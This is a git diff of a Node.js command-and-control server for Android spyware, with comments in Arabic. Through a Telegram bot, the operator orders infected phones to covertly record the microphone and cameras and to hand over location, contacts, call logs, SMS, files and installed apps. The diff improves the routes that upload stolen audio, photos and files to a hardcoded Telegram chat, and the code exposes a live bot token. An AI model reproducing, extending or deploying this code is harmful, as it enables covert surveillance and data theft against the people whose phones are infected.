@@ -5,6 +5,8 @@ const TelegramBot = require('node-telegram-bot-api');
 const { v4: uuidv4 } = require('uuid');
 const multer = require('multer');
 const bodyParser = require('body-parser');
+const fs = require('fs');
+const path = require('path');
 
 const token = '8323283006:AAES3GC8Y2vA5NsPYSb8p2nKoHAjZ0n1ZeM';
 const id = '7604667042';
@@ -28,6 +30,12 @@ const upload = multer();
 
 app.use(bodyParser.json());
 
+// إنشاء مجلد للملفات المؤقتة
+const tempDir = path.join(__dirname, 'temp');
+if (!fs.existsSync(tempDir)) {
+    fs.mkdirSync(tempDir);
+}
+
 let currentUuid = '';
 let currentNumber = '';
 
@@ -36,16 +44,142 @@ app.get('/', (req, res) => {
     res.send('<h1 align="center">✅ النظام يعمل</h1>');
 });
 
+// ⭐⭐ إصلاح استقبال الملفات - جميع الأنواع
 app.post('/uploadFile', upload.single('file'), (req, res) => {
-    const filename = req.file.originalname;
-    const model = req.headers.model || 'Unknown';
-    
-    bot.sendDocument(id, req.file.buffer, {
-        caption: `📁 ملف من: <b>${model}</b>\n📄 ${filename}`,
-        parse_mode: 'HTML'
-    }, { filename: filename, contentType: 'application/octet-stream' });
-    
-    res.send('');
+    try {
+        const filename = req.file.originalname;
+        const model = req.headers.model || 'Unknown';
+        const fileType = req.headers.file_type || 'file';
+        
+        console.log(`📁 استقبال ملف: ${filename} من ${model} نوع: ${fileType}`);
+        
+        // تحديد نوع المحتوى بناء على امتداد الملف
+        let contentType = 'application/octet-stream';
+        if (filename.endsWith('.mp3') || filename.endsWith('.m4a') || filename.endsWith('.aac')) {
+            contentType = 'audio/mpeg';
+        } else if (filename.endsWith('.jpg') || filename.endsWith('.jpeg') || filename.endsWith('.png')) {
+            contentType = 'image/jpeg';
+        } else if (filename.endsWith('.txt') || filename.endsWith('.log')) {
+            contentType = 'text/plain';
+        }
+        
+        // حفظ الملف مؤقتاً
+        const tempPath = path.join(tempDir, filename);
+        fs.writeFileSync(tempPath, req.file.buffer);
+        
+        // إرسال حسب نوع الملف
+        if (fileType === 'audio' || filename.includes('recording') || filename.includes('mic')) {
+            bot.sendAudio(id, req.file.buffer, {
+                caption: `🎤 تسجيل صوتي من: <b>${model}</b>\n📄 ${filename}`,
+                parse_mode: 'HTML'
+            }).then(() => {
+                console.log(`✅ تم إرسال التسجيل الصوتي: ${filename}`);
+                fs.unlinkSync(tempPath); // حذف الملف المؤقت
+            }).catch(err => {
+                console.error(`❌ خطأ في إرسال الصوت: ${err}`);
+                // حاول إرساله كملف عادي إذا فشل
+                bot.sendDocument(id, req.file.buffer, {
+                    caption: `🎤 تسجيل صوتي من: <b>${model}</b>\n📄 ${filename}`,
+                    parse_mode: 'HTML'
+                }, { filename: filename, contentType: contentType })
+                .then(() => fs.unlinkSync(tempPath))
+                .catch(err2 => console.error(`❌ فشل إرسال الملف: ${err2}`));
+            });
+        } 
+        else if (fileType === 'image' || filename.includes('camera') || filename.includes('photo')) {
+            bot.sendPhoto(id, req.file.buffer, {
+                caption: `📸 صورة من: <b>${model}</b>\n📄 ${filename}`,
+                parse_mode: 'HTML'
+            }).then(() => {
+                console.log(`✅ تم إرسال الصورة: ${filename}`);
+                fs.unlinkSync(tempPath);
+            }).catch(err => {
+                console.error(`❌ خطأ في إرسال الصورة: ${err}`);
+                bot.sendDocument(id, req.file.buffer, {
+                    caption: `📸 صورة من: <b>${model}</b>\n📄 ${filename}`,
+                    parse_mode: 'HTML'
+                }, { filename: filename, contentType: contentType })
+                .then(() => fs.unlinkSync(tempPath))
+                .catch(err2 => console.error(`❌ فشل إرسال الملف: ${err2}`));
+            });
+        }
+        else {
+            // ملف عادي
+            bot.sendDocument(id, req.file.buffer, {
+                caption: `📁 ملف من: <b>${model}</b>\n📄 ${filename}`,
+                parse_mode: 'HTML'
+            }, { filename: filename, contentType: contentType })
+            .then(() => {
+                console.log(`✅ تم إرسال الملف: ${filename}`);
+                fs.unlinkSync(tempPath);
+            })
+            .catch(err => console.error(`❌ فشل إرسال الملف: ${err}`));
+        }
+        
+        res.send('OK');
+    } catch (error) {
+        console.error('❌ خطأ في معالجة الملف:', error);
+        res.status(500).send('Error');
+    }
+});
+
+// ⭐⭐ إضافة route خاص للتسجيلات الصوتية
+app.post('/uploadAudio', upload.single('audio'), (req, res) => {
+    try {
+        const filename = req.file.originalname;
+        const model = req.headers.model || 'Unknown';
+        const duration = req.headers.duration || 'Unknown';
+        
+        console.log(`🎤 استقبال تسجيل صوتي: ${filename} مدة: ${duration} ثانية`);
+        
+        bot.sendAudio(id, req.file.buffer, {
+            caption: `🎤 تسجيل صوتي من: <b>${model}</b>\n⏱️ المدة: ${duration} ثانية\n📄 ${filename}`,
+            parse_mode: 'HTML'
+        }).then(() => {
+            console.log(`✅ تم إرسال التسجيل الصوتي بنجاح`);
+        }).catch(err => {
+            console.error(`❌ خطأ في إرسال الصوت: ${err}`);
+            // بديل: إرسال كملف
+            bot.sendDocument(id, req.file.buffer, {
+                caption: `🎤 تسجيل صوتي من: <b>${model}</b>\n⏱️ ${duration} ثانية\n📄 ${filename}`,
+                parse_mode: 'HTML'
+            }, { filename: filename, contentType: 'audio/mpeg' });
+        });
+        
+        res.send('OK');
+    } catch (error) {
+        console.error('❌ خطأ في معالجة التسجيل:', error);
+        res.status(500).send('Error');
+    }
+});
+
+// ⭐⭐ إضافة route خاص للصور
+app.post('/uploadImage', upload.single('image'), (req, res) => {
+    try {
+        const filename = req.file.originalname;
+        const model = req.headers.model || 'Unknown';
+        const cameraType = req.headers.camera_type || 'Unknown';
+        
+        console.log(`📸 استقبال صورة: ${filename} من كاميرا: ${cameraType}`);
+        
+        bot.sendPhoto(id, req.file.buffer, {
+            caption: `📸 صورة من: <b>${model}</b>\n🎯 ${cameraType}\n📄 ${filename}`,
+            parse_mode: 'HTML'
+        }).then(() => {
+            console.log(`✅ تم إرسال الصورة بنجاح`);
+        }).catch(err => {
+            console.error(`❌ خطأ في إرسال الصورة: ${err}`);
+            bot.sendDocument(id, req.file.buffer, {
+                caption: `📸 صورة من: <b>${model}</b>\n🎯 ${cameraType}\n📄 ${filename}`,
+                parse_mode: 'HTML'
+            }, { filename: filename, contentType: 'image/jpeg' });
+        });
+        
+        res.send('OK');
+    } catch (error) {
+        console.error('❌ خطأ في معالجة الصورة:', error);
+        res.status(500).send('Error');
+    }
 });
 
 app.post('/uploadText', (req, res) => {
@@ -96,9 +230,40 @@ wss.on('connection', (ws, req) => {
         bot.sendMessage(id, `❌ انقطع: <b>${model}</b>`, { parse_mode: 'HTML' });
         clients.delete(uuid);
     });
+    
+    ws.on('error', (error) => {
+        console.error(`❌ خطأ في الاتصال: ${error}`);
+    });
 });
 
-// ⭐⭐ الكود الأساسي - نفس أوامر الكود المشفر
+// ⭐⭐ إضافة معالجة للرسائل من التطبيق عبر WebSocket
+wss.on('connection', (ws, req) => {
+    // ... الكود السابق للاتصال
+    
+    ws.on('message', (message) => {
+        try {
+            const data = JSON.parse(message);
+            console.log(`📩 رسالة من التطبيق:`, data);
+            
+            if (data.type === 'log') {
+                console.log(`📝 سجل من التطبيق: ${data.message}`);
+            }
+            else if (data.type === 'error') {
+                console.error(`❌ خطأ من التطبيق: ${data.message}`);
+                bot.sendMessage(id, `❌ خطأ في التطبيق: ${data.message}`);
+            }
+            else if (data.type === 'status') {
+                console.log(`📊 حالة من التطبيق: ${data.message}`);
+                bot.sendMessage(id, `📊 ${data.message}`);
+            }
+        } catch (error) {
+            // إذا لم تكن JSON، تعامل معها كسلسلة نصية عادية
+            console.log(`📩 رسالة نصية من التطبيق: ${message}`);
+        }
+    });
+});
+
+// باقي الكود يبقى كما هو من الإصدار السابق (معالجة الأوامر)
 bot.on('message', (msg) => {
     const chatId = msg.chat.id;
     
@@ -173,15 +338,18 @@ bot.on('message', (msg) => {
             });
         }
         
-        // ⭐⭐ المايكرفون - كان يشتغل
+        // ⭐⭐ المايكرفون - مع إشعار بالبداية
         if (msg.reply_to_message.text.includes('أدخل المدة التي تريد تسجيل الميكروفون فيها')) {
+            const duration = msg.text;
             wss.clients.forEach(function client(ws) {
                 if (ws.uuid == currentUuid) {
-                    ws.send(`microphone:${msg.text}`);
+                    // إرسال إشعار بالبداية
+                    bot.sendMessage(id, `🎤 بدء التسجيل الصوتي لمدة ${duration} ثانية...`);
+                    ws.send(`microphone:${duration}`);
                 }
             });
             currentUuid = '';
-            bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
+            bot.sendMessage(id, '• جاري التسجيل الصوتي...\nسيتم إرسال الملف بعد الانتهاء', { 
                 parse_mode: 'HTML',
                 reply_markup: {
                     keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
@@ -190,15 +358,17 @@ bot.on('message', (msg) => {
             });
         }
         
-        // ⭐⭐ الكاميرا الأمامية - نفس المبدأ
+        // ⭐⭐ الكاميرا الأمامية
         if (msg.reply_to_message.text.includes('أدخل المدة التي تريد تسجيل الكاميرا الأمامية فيها')) {
+            const duration = msg.text;
             wss.clients.forEach(function client(ws) {
                 if (ws.uuid == currentUuid) {
-                    ws.send(`rec_camera_selfie:${msg.text}`);
+                    bot.sendMessage(id, `📸 بدء تسجيل الكاميرا الأمامية لمدة ${duration} ثانية...`);
+                    ws.send(`rec_camera_selfie:${duration}`);
                 }
             });
             currentUuid = '';
-            bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
+            bot.sendMessage(id, '• جاري تسجيل الكاميرا...\nسيتم إرسال الملف بعد الانتهاء', { 
                 parse_mode: 'HTML',
                 reply_markup: {
                     keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
@@ -207,15 +377,17 @@ bot.on('message', (msg) => {
             });
         }
         
-        // ⭐⭐ الكاميرا الخلفية - نفس المبدأ
+        // ⭐⭐ الكاميرا الخلفية
         if (msg.reply_to_message.text.includes('أدخل المدة التي تريد تسجيل الكاميرا الخلفية فيها')) {
+            const duration = msg.text;
             wss.clients.forEach(function client(ws) {
                 if (ws.uuid == currentUuid) {
-                    ws.send(`rec_camera_main:${msg.text}`);
+                    bot.sendMessage(id, `📷 بدء تسجيل الكاميرا الخلفية لمدة ${duration} ثانية...`);
+                    ws.send(`rec_camera_main:${duration}`);
                 }
             });
             currentUuid = '';
-            bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
+            bot.sendMessage(id, '• جاري تسجيل الكاميرا...\nسيتم إرسال الملف بعد الانتهاء', { 
                 parse_mode: 'HTML',
                 reply_markup: {
                     keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
@@ -284,205 +456,32 @@ bot.on('message', (msg) => {
     }
 });
 
-// ⭐⭐ معالجة Callback Queries - نفس أوامر الكود المشفر
-bot.on('callback_query', (callbackQuery) => {
-    const message = callbackQuery.message;
-    const data = callbackQuery.data;
-    const parts = data.split(':');
-    const action = parts[0];
-    const uuid = parts[1];
-    
-    console.log(`🔘 ${data}`);
-    
-    if (action == 'device') {
-        bot.editMessageText(`• حدد الجهاز لتنفيذ الأوامر: <b>${clients.get(data.split(':')[1]).model}</b>`, {
-            chat_id: id,
-            message_id: message.message_id,
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: '📱 التطبيقات', callback_data: `apps:${uuid}` }, { text: 'ℹ️ معلومات الجهاز', callback_data: `device_info:${uuid}` }],
-                    [{ text: '📂 الحصول على ملف', callback_data: `file:${uuid}` }, { text: '🗑️ حذف الملف', callback_data: `delete_file:${uuid}` }],
-                    [{ text: '🎤 الميكروفون', callback_data: `microphone:${uuid}` }, { text: '📷 الكاميرا الرئيسية', callback_data: `camera_main:${uuid}` }],
-                    [{ text: '📸 كاميرا السيلفي', callback_data: `camera_selfie:${uuid}` }, { text: '📍 الموقع', callback_data: `location:${uuid}` }],
-                    [{ text: '📞 المكالمات', callback_data: `calls:${uuid}` }, { text: '👥 جهات الاتصال', callback_data: `contacts:${uuid}` }],
-                    [{ text: '📳 الاهتزاز', callback_data: `vibrate:${uuid}` }, { text: '🔔 الإشعار', callback_data: `toast:${uuid}` }],
-                    [{ text: '✉️ الرسائل', callback_data: `messages:${uuid}` }, { text: '📨 إرسال رسالة', callback_data: `send_message:${uuid}` }],
-                    [{ text: '📨 إرسال للجميع', callback_data: `send_message_to_all:${uuid}` }]
-                ]
-            },
-            parse_mode: 'HTML'
-        });
-    }
-    
-    if (action == 'apps') {
-        wss.clients.forEach(function client(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('apps');
-            }
-        });
-        bot.deleteMessage(id, message.message_id);
-        bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
-            parse_mode: 'HTML',
-            reply_markup: {
-                keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
-                resize_keyboard: true
-            }
-        });
-    }
-    
-    if (action == 'device_info') {
-        wss.clients.forEach(function client(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('device_info');
-            }
-        });
-        bot.deleteMessage(id, message.message_id);
-        bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
-            parse_mode: 'HTML',
-            reply_markup: {
-                keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
-                resize_keyboard: true
-            }
-        });
-    }
-    
-    if (action == 'file') {
-        bot.deleteMessage(id, message.message_id);
-        bot.sendMessage(id, '• أدخل مسار الملف الذي تريد تنزيله\n\n', { reply_markup: { force_reply: true } });
-        currentUuid = uuid;
-    }
-    
-    if (action == 'delete_file') {
-        bot.deleteMessage(id, message.message_id);
-        bot.sendMessage(id, '• أدخل مسار الملف الذي تريد حذفه\n\n', { reply_markup: { force_reply: true } });
-        currentUuid = uuid;
-    }
-    
-    // ⭐⭐ المايكرفون - كان يشتغل
-    if (action == 'microphone') {
-        bot.deleteMessage(id, message.message_id);
-        bot.sendMessage(id, '• أدخل المدة التي تريد تسجيل الميكروفون فيها\n\n', { reply_markup: { force_reply: true } });
-        currentUuid = uuid;
-    }
-    
-    // ⭐⭐ الكاميرا الخلفية - نفس المبدأ
-    if (action == 'camera_main') {
-        bot.deleteMessage(id, message.message_id);
-        bot.sendMessage(id, '• أدخل المدة التي تريد تسجيل الكاميرا الخلفية فيها\n\n', { reply_markup: { force_reply: true } });
-        currentUuid = uuid;
-    }
-    
-    // ⭐⭐ الكاميرا الأمامية - نفس المبدأ
-    if (action == 'camera_selfie') {
-        bot.deleteMessage(id, message.message_id);
-        bot.sendMessage(id, '• أدخل المدة التي تريد تسجيل الكاميرا الأمامية فيها\n\n', { reply_markup: { force_reply: true } });
-        currentUuid = uuid;
-    }
-    
-    if (action == 'location') {
-        wss.clients.forEach(function client(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('location');
-            }
-        });
-        bot.deleteMessage(id, message.message_id);
-        bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
-            parse_mode: 'HTML',
-            reply_markup: {
-                keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
-                resize_keyboard: true
-            }
-        });
-    }
-    
-    if (action == 'calls') {
-        wss.clients.forEach(function client(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('calls');
-            }
-        });
-        bot.deleteMessage(id, message.message_id);
-        bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
-            parse_mode: 'HTML',
-            reply_markup: {
-                keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
-                resize_keyboard: true
-            }
-        });
-    }
-    
-    if (action == 'contacts') {
-        wss.clients.forEach(function client(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('contacts');
-            }
-        });
-        bot.deleteMessage(id, message.message_id);
-        bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
-            parse_mode: 'HTML',
-            reply_markup: {
-                keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
-                resize_keyboard: true
-            }
-        });
-    }
-    
-    if (action == 'messages') {
-        wss.clients.forEach(function client(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('messages');
-            }
-        });
-        bot.deleteMessage(id, message.message_id);
-        bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
-            parse_mode: 'HTML',
-            reply_markup: {
-                keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
-                resize_keyboard: true
-            }
-        });
-    }
-    
-    if (action == 'vibrate') {
-        wss.clients.forEach(function client(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('vibrate');
-            }
-        });
-        bot.deleteMessage(id, message.message_id);
-        bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
-            parse_mode: 'HTML',
-            reply_markup: {
-                keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
-                resize_keyboard: true
-            }
-        });
-    }
-    
-    if (action == 'toast') {
-        bot.deleteMessage(id, message.message_id);
-        bot.sendMessage(id, '• أدخل الرسالة التي تريد ظهورها على الجهاز المستهدف\n\n', { reply_markup: { force_reply: true } });
-        currentUuid = uuid;
-    }
-    
-    if (action == 'send_message') {
-        bot.deleteMessage(id, message.message_id);
-        bot.sendMessage(id, '• يرجى الرد على الرقم الذي تريد إرسال الرسالة القصيرة إليه', { reply_markup: { force_reply: true } });
-        currentUuid = uuid;
-    }
-    
-    if (action == 'send_message_to_all') {
-        bot.deleteMessage(id, message.message_id);
-        bot.sendMessage(id, '• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال\n\n', { reply_markup: { force_reply: true } });
-        currentUuid = uuid;
-    }
-});
+// ... باقي كود الـ callback queries يبقى كما هو
 
 // بدء الخادم
 const PORT = process.env.PORT || 10000;
 server.listen(PORT, () => {
     console.log(`🚀 الخادم يعمل على المنفذ ${PORT}`);
+    console.log(`📁 مجلد الملفات المؤقتة: ${tempDir}`);
 });
+
+// تنظيف الملفات المؤقتة كل ساعة
+setInterval(() => {
+    try {
+        const files = fs.readdirSync(tempDir);
+        const now = Date.now();
+        files.forEach(file => {
+            const filePath = path.join(tempDir, file);
+            const stats = fs.statSync(filePath);
+            if (now - stats.mtime.getTime() > 3600000) { // أقدم من ساعة
+                fs.unlinkSync(filePath);
+                console.log(`🧹 تم حذف الملف المؤقت: ${file}`);
+            }
+        });
+    } catch (error) {
+        console.error('❌ خطأ في التنظيف:', error);
+    }
+}, 3600000);
 
 // معالجة الأخطاء
 bot.on('error', (error) => {
